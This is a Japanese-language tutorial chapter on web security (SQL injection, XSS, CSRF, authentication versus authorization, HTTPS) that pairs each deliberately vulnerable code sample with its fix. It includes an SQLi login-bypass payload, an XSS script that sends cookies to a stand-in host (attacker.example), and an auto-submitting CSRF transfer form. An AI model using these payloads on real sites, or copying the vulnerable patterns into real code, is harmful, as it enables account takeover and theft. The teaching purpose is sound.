# Chapter 6: セキュリティ

> Status: 完了

## この章で学ぶこと

- なぜ Web アプリは攻撃されるのか（攻撃者は何を狙うのか）
- <mark>**SQL インジェクション（SQLi）**</mark> — 文字列連結で SQL を組み立てると DB を乗っ取られる
- <mark>**XSS（クロスサイトスクリプティング）**</mark> — ユーザー入力をそのまま HTML に貼ると JS を実行される
- <mark>**CSRF（Cross-Site Request Forgery）**</mark> — ログイン中のユーザーに「意図しない操作」を踏ませる
- <mark>**認証（Authentication）と認可（Authorization）**</mark> の違い
- HTTPS が **なぜ必要か**（盗聴・改ざんからの防御）

> [!CAUTION]
> ここで学ぶ技術を **他人のサービスに対して試すと法律違反**（不正アクセス禁止法など）になります。攻撃の再現は **必ず自分のローカル環境内** で行ってください。

## 本文

### 1. 攻撃者は何を狙うのか

攻撃の動機をざっくり分けると:

- **データを盗む**: 個人情報、クレジットカード番号、パスワード
- **データを書き換える**: 残高を書き換える、商品の値段を変える
- **なりすます**: 他人のアカウントでログイン・操作する
- **サービスを止める**: いわゆる DoS
- **踏み台にする**: そのサーバーを使って他のサーバーを攻撃する

「うちの個人サイトだから盗まれて困るデータないし」と思っても、**踏み台** にされると別の被害に巻き込まれます。Web に出すなら最低限の対策は要る、と覚えておく。

### 2. SQL インジェクション

#### 2-1. 何が起きるか

DB にユーザー情報があるとして、ログインのコードをこう書いたとします。

```python
# ★ 絶対に書いてはいけないコード
cursor.execute(
    "SELECT * FROM users WHERE name = '" + name + "' AND password = '" + password + "'"
)
```

`name` に普通に `alice` が来れば、SQL は

```sql
SELECT * FROM users WHERE name = 'alice' AND password = 'xxx'
```

になって普通に動く。問題は、`name` 欄に攻撃者がこう入れたとき:

```
' OR '1'='1
```

組み立てられる SQL は:

```sql
SELECT * FROM users WHERE name = '' OR '1'='1' AND password = '...'
```

<mark>**`'1'='1'` は常に真**</mark>。条件が崩れて、テーブルの全ユーザーがヒットしてしまう。実装次第で「最初のユーザー（多くは管理者）でログイン成功」となります。

これが <mark>**SQL インジェクション**</mark>。ユーザー入力に紛れ込ませた SQL の断片が、サーバー側で組み立てる SQL の構文として解釈されてしまう脆弱性。

**実例**: 2010 年代以降、有名サービスの大規模情報流出の多くは SQLi が起点。**「文字列連結で SQL を組み立てた」その 1 行** が全ての始まりだったりする。

#### 2-2. 直し方: プレースホルダ（パラメータ化クエリ）

```python
# OK
cursor.execute(
    "SELECT * FROM users WHERE name = ? AND password = ?",
    (name, password),
)
```

<mark>**`?`（プレースホルダ）に対して値を別引数で渡す**</mark>。DB ライブラリが「これは SQL の構造ではなく値だ」と判断して、引用符のエスケープや SQL 解釈をしてくれる。`' OR '1'='1` という文字列が来ても、それは **「`' OR '1'='1` という名前のユーザー」を探すだけ** で、SQL 構文には混ざらない。

> [!IMPORTANT]
> SQLi 対策は <mark>**「文字列連結で SQL を組み立てない」**</mark> に尽きます。<mark>**エスケープを自前で書こうとしない**</mark>（プレースホルダを使う）。これだけで 99% 防げる。

### 3. XSS（クロスサイトスクリプティング）

#### 3-1. 何が起きるか

掲示板アプリで、投稿された本文をこう表示したとします。

```python
# ★ 絶対に書いてはいけないテンプレート
html = "<div>" + post_body + "</div>"
```

`post_body` が `今日はいい天気` なら何の問題もない。だが攻撃者がこう投稿したらどうなるか:

```html
<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
```

サーバーが組み立てた HTML はそのまま `<script>...</script>` を含み、**他のユーザーがこの投稿を表示した瞬間にその人のブラウザで JS が実行される**。攻撃者の URL に Cookie（≒ セッション）が送られて、ログインを乗っ取られる。

これが <mark>**XSS**</mark>。「他人のサイト経由で、被害者のブラウザに JS を実行させる」攻撃。

**実例**: SNS の投稿欄、口コミサイト、Q&A サイトなど、**ユーザーの入力をそのまま画面に出すサイト** が全部標的になりうる。

#### 3-2. 直し方: HTML エスケープ

ユーザー入力を HTML として埋め込むときは、<mark>**特殊文字をエスケープする**</mark>。

| 元 | エスケープ後 |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#39;` |

エスケープすれば、`<script>` は `&lt;script&gt;` という **ただの文字列** としてブラウザに表示されるだけで、スクリプトとしては実行されない。

実用的には:
- **テンプレートエンジンを使う**（Jinja2, React, Vue など）。<mark>**ほとんどのモダンなテンプレートは、デフォルトで自動エスケープ**</mark> してくれる
- DOM 操作するときも `element.innerHTML = ユーザー入力` ではなく **`element.textContent = ユーザー入力`** を使う。`textContent` は HTML として解釈せず文字列として入れる

> [!TIP]
> 「Markdown を表示したい」「リッチエディタを使いたい」のように **意図的に HTML を許したい** ときは、`DOMPurify` のような <mark>**サニタイズライブラリ**</mark> を使って許可タグだけ残す。手書きで `<script>` だけ消す、はやってはいけない（書き方の抜け穴が無数にある）。

### 4. CSRF（Cross-Site Request Forgery）

#### 4-1. 何が起きるか

あなたが銀行サイト `bank.example` にログイン中。攻撃者が罠ページ `evil.example` を用意して、そこに次のような HTML が仕込まれていた。

```html
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.forms[0].submit()</script>
```

罠ページを開いた瞬間、ブラウザは `bank.example` への POST を送ります。<mark>**ブラウザは「同じドメイン宛なら Cookie を自動で付ける」**</mark>ので、銀行から見ると **「ログイン中のあなたから来た普通の振込リクエスト」** に見える。

これが <mark>**CSRF**</mark>。「他のサイト経由で、ログイン中のユーザーに勝手に操作させる」攻撃。

XSS との違いに注意:
- **XSS**: 攻撃者の JS が **被害者のブラウザで実行** される（情報を盗める）
- **CSRF**: 被害者の **ブラウザに通常リクエストを送らせる**（情報は見えないが操作はできる）

#### 4-2. 直し方

主な対策はこの組み合わせ:

- <mark>**CSRF トークン**</mark>: フォームに「サーバーが発行した使い捨ての値」を埋め込む。攻撃者の罠ページにはそのトークンを書けない → POST がトークン不一致で弾かれる
- <mark>**`SameSite` Cookie 属性**</mark>: Cookie に `SameSite=Lax` または `Strict` を付けると、別サイトからの POST に Cookie が **付かなくなる**。最近のブラウザはデフォルトが `Lax`
- **重要操作には再認証** を要求する（パスワード再入力など）

FastAPI / Flask の認証ライブラリは CSRF トークン発行を組み込みで持っているので、**自前で全部組まずに枠組みに乗る** のが基本。

### 5. 認証と認可

似ているけど別物。

| | 認証（Authentication） | 認可（Authorization） |
|---|---|---|
| 一言で | <mark>**「あなたは誰？」**</mark> | <mark>**「あなたはこれをやっていい？」**</mark> |
| 例 | ログイン、指紋認証、SMS コード | 「管理者だけがユーザー削除できる」「自分の投稿しか編集できない」 |
| 失敗時のレスポンス | `401 Unauthorized` | `403 Forbidden` |

**実例**:
- Twitter にログインする = **認証**
- ログインしたあなたが「他人のツイートを編集できない」 = **認可**

両方を別の仕組みとして整理しておくと、後述のセッションや権限管理の議論がぐっと整理されます。

#### 認証の代表的な実装

| 方式 | 使われる場所 |
|---|---|
| **セッション Cookie** | Web アプリの伝統的なログイン |
| **JWT（JSON Web Token）** | SPA や API の認証 |
| **OAuth 2.0** | 「Google でログイン」「GitHub でログイン」 |
| **API キー** | 開発者向け API、サーバー間連携 |
| **多要素認証（MFA / 2FA）** | パスワード + SMS / Authenticator アプリ |

### 6. HTTPS の意義

Chapter 3 で「HTTPS は HTTP + TLS」と書きました。中身の TLS が何をしてくれるか:

1. <mark>**盗聴防止（暗号化）**</mark>: 通信経路の途中（公衆 Wi-Fi、ISP、国家レベルの傍受装置）から **平文では読めない**
2. <mark>**改ざん防止**</mark>: 途中で書き換えられたら受け取り側が気付ける
3. <mark>**なりすまし防止（サーバー認証）**</mark>: 「`bank.example` だと名乗っているこのサーバーは、確かに `bank.example` の証明書を持っている」と検証できる

HTTP のままだと、カフェの Wi-Fi に繋いでログインしたパスワードが、同じ Wi-Fi の隣の人に丸見え、ということが起きうる。

**実例**: 数年前まで「`http://` で始まる」サイトをブラウザは普通に表示していました。今は Chrome / Firefox とも、`http://` のサイトを開くとアドレスバーに「**保護されていない通信**」と警告が出ます。これは「HTTPS が標準で、HTTP は例外」と業界がシフトした結果。

#### 証明書

HTTPS には **TLS 証明書** が要る。昔は有料が普通だったが、今は <mark>**Let's Encrypt が無料で発行**</mark> してくれる。クラウド（AWS, GCP, Vercel など）を使うと、ボタン 1 つで自動取得・自動更新までやってくれることが多い。Chapter 7 で扱う。

### 7. その他、覚えておきたい鉄則

- <mark>**「ユーザー入力は信用しない」**</mark>: フォーム、URL のクエリ、Cookie、HTTP ヘッダー、ファイル名 … 外から来るものは全部、悪意があるかもしれないという前提で扱う
- <mark>**「サーバー側で検証する」**</mark>: クライアント側のバリデーション（JS で「メールアドレスの形式チェック」など）は UX のためだけ。**攻撃者は JS を回避して直接 API を叩いてくる**ので、サーバー側で必ずもう一度検証する
- **エラーメッセージで内部情報を漏らさない**: 「DB エラー: Connection refused at ...」みたいなのは攻撃者へのヒントになる。本番ではユーザーには汎用エラーだけ見せて、詳細はサーバーログにだけ残す
- **パスワードは平文で保存しない**: <mark>**bcrypt や argon2 などのハッシュ関数でハッシュ化して保存**</mark>。「ハッシュ ≠ 暗号化」で、ハッシュは原理的に元に戻せない方向の変換
- **依存ライブラリは更新する**: 古いライブラリには公開された脆弱性がある。`pip-audit`、`npm audit`、GitHub Dependabot などを定期的に回す

```
├── 02_xss_vulnerable.py    # ★ 脆弱: ユーザー入力をそのまま HTML に貼って <script> を実行

└── README.md
```

```bash
cd chapters/06-security/code

# 1. SQLi の再現
python 01_sqli_vulnerable.py   # → 'OR' 攻撃でログイン成功してしまう
python 01_sqli_fixed.py        # → 同じ入力でログイン失敗（防げている）

# 2. XSS の再現（生成された HTML をブラウザで開いて確認）
python 02_xss_vulnerable.py    # → vulnerable.html を生成。開くと alert が走る
python 02_xss_fixed.py         # → fixed.html を生成。<script> が文字列として表示されるだけ
```

> [!CAUTION]
> 生成される HTML には学習用に `<script>alert(...)</script>` が含まれます。**ブラウザで開く前にコードを読んで** 何が起きるか理解してから開いてください。

## つまずきポイント

- <mark>**「文字列連結で SQL を組み立てない」**</mark> が SQLi 対策のほぼ全て。プレースホルダ（`?` や `%s`）を使う
- <mark>**XSS は「出力時のエスケープ」が本筋**</mark>。「入力時にフィルタする」だけだと抜け穴が残る（同じデータが別の文脈で表示されたときに化ける）
- <mark>**CSRF と XSS は別の攻撃**</mark>: CSRF は「ログイン中のあなたに勝手に操作させる」、XSS は「あなたのブラウザで JS を実行する」
- <mark>**`401` と `403` の使い分け**</mark>: `401` は「あなたが誰か分からない（ログインして）」、`403` は「あなただと分かったが権限がない」
- **パスワードは平文保存しない**: ハッシュ化する。bcrypt / argon2 が定番
- **本番のエラーメッセージは丸めて出す**: スタックトレースをユーザー画面に出さない
- **依存ライブラリは古くなる = 脆弱性が増える**: 定期的にアップデートする

## 重要な単語まとめ

| 用語 | 一言で言うと | 身近な実例 |
|---|---|---|
| **SQL インジェクション** | 入力に SQL の断片を紛れ込ませて DB を操作する攻撃 | 「`' OR '1'='1`」でログイン突破 |
| **プレースホルダ / パラメータ化クエリ** | 値と SQL 構造を分けて渡す書き方。SQLi の最終防御 | `cursor.execute("...?", (name,))` |
| **XSS** | 他人のサイト経由で被害者ブラウザに JS を実行させる攻撃 | 投稿欄に `<script>` を仕込む |
| **HTML エスケープ** | 特殊文字を実体参照に変換して無害化 | `<` → `&lt;` |
| **サニタイズ / DOMPurify** | 許可した HTML タグだけ残す処理 | リッチエディタの投稿を表示する前 |
| **CSRF** | ログイン中のユーザーに意図しない操作を踏ませる攻撃 | 罠ページからの自動振込 |
| **CSRF トークン** | フォームに埋め込む使い捨ての値で CSRF を弾く | hidden input の `csrf_token` |
| **`SameSite` Cookie** | 他サイトからの遷移時に Cookie を送らないようにする属性 | 最近のブラウザはデフォルト `Lax` |
| **認証（Authentication）** | 「あなたは誰？」を確かめる | ログイン画面、指紋認証 |
| **認可（Authorization）** | 「あなたはこれをやっていい？」を判断する | 「管理者だけ削除できる」 |
| **セッション / JWT / OAuth** | 認証状態を保持・連携する代表的な方式 | Cookie のセッション ID、Google ログイン |
| **TLS / HTTPS** | 通信の暗号化・改ざん防止・なりすまし防止 | URL バーの鍵マーク |
| **Let's Encrypt** | 無料で TLS 証明書を発行してくれる認証局 | 個人サイト・小規模サービスの定番 |
| **ハッシュ化** | 一方向の変換。元に戻せない方向で保存する | パスワードは bcrypt でハッシュ化して保存 |
